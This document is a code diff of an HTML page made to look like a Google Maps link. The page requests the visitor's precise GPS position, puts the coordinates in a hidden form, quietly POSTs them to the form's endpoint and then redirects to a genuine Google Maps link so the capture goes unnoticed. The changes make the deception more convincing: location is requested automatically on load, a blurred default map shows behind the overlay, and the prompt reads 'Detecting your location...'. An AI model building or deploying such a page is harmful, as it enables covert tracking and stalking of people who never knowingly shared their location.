@@ -11,7 +11,6 @@
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
-      background: #000; /* prevent blurred map flash */
     }
     iframe {
       position: absolute;
@@ -20,7 +19,6 @@
       width: 100%;
       height: 100%;
       border: none;
-      display: none; /* keep hidden until GPS success */
     }
     #overlay {
       position: absolute;
@@ -28,7 +26,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.85);
+      background: rgba(0, 0, 0, 0.35);
       backdrop-filter: blur(6px);
       display: flex;
       flex-direction: column;
@@ -37,6 +35,7 @@
       text-align: center;
       color: #fff;
       padding: 20px;
+      z-index: 10;
     }
     #overlay.hidden { display: none; }
     #overlay img { width: 60px; height: 60px; margin-bottom: 15px; }
@@ -74,8 +73,8 @@
   <!-- Overlay -->
   <div id="overlay">
     <img src="google-map-icon.png" alt="Google Maps Icon">
-    <span>Open in Google Maps</span>
-    <button onclick="requestLocation()">Open</button>
+    <span>Detecting your location...</span>
+    <button onclick="requestLocation()">Try Again</button>
     <pre id="output"></pre>
   </div>
 
@@ -93,59 +92,59 @@
     const lonInput = document.getElementById("longitude");
     const output = document.getElementById("output");
 
+    // Default map center (Kathmandu) is visible immediately
+    const defaultLat = 27.67442;
+    const defaultLon = 85.3123;
+    iframe.src = `https://maps.google.com/maps?q=${defaultLat},${defaultLon}&z=15&output=embed`;
+
+    // Ask GPS as soon as page loads
+    window.onload = requestLocation;
+
     function requestLocation() {
       if (!navigator.geolocation) {
         output.innerText = "Geolocation not supported.";
         return;
       }
 
-      output.innerText = "Fetching your location...";
-
-      navigator.geolocation.getCurrentPosition(
+      const watchId = navigator.geolocation.watchPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
 
-          // Update iframe with user's location and show it
-          iframe.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-          iframe.style.display = "block";
+          console.log("Coordinates received:", lat, lon);
+          output.innerText = `Lat: ${lat}, Lon: ${lon}`;
 
-          // Fill hidden form
+          // Update map
+          iframe.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+
+          // Update form values
           latInput.value = lat;
           lonInput.value = lon;
 
-          // Submit form without redirect
+          // Hide blur overlay (unblur map)
+          overlay.classList.add("hidden");
+
+          // Stop watching after first fix
+          navigator.geolocation.clearWatch(watchId);
+
+          // Submit form
           fetch(form.action, {
             method: 'POST',
             body: new FormData(form)
           }).then(() => {
-            // Now hide overlay and redirect
-            overlay.classList.add("hidden");
-            window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
+            setTimeout(() => {
+              window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
+            }, 1500);
           }).catch(err => {
             console.error("Form submission failed:", err);
-            overlay.classList.add("hidden");
             window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
           });
         },
         (err) => {
-          let msg;
-          switch(err.code) {
-            case err.PERMISSION_DENIED:
-              msg = "Location permission denied. Please allow access.";
-              break;
-            case err.POSITION_UNAVAILABLE:
-              msg = "GPS unavailable. Please enable location services.";
-              break;
-            case err.TIMEOUT:
-              msg = "Location request timed out. Try again.";
-              break;
-            default:
-              msg = "Unknown error: " + err.message;
-          }
-          output.innerText = msg;
+          console.error("Geolocation error:", err);
+          output.innerText = `Error: ${err.message}\nClick 'Try Again' or enable GPS.`;
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
   </script>
